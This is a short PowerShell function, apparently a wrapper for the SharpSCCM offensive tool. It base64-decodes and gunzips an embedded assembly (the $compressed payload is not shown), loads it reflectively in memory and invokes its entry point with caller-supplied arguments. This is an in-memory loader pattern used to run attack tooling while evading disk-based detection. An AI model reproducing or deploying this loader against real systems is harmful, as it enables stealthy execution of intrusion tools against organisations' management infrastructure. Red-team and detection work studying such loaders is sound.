function Invoke-SharpSCCM ($Params){
    if (!$SharpSCCM_assembly){
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:SharpSCCM_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $SharpSCCM_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}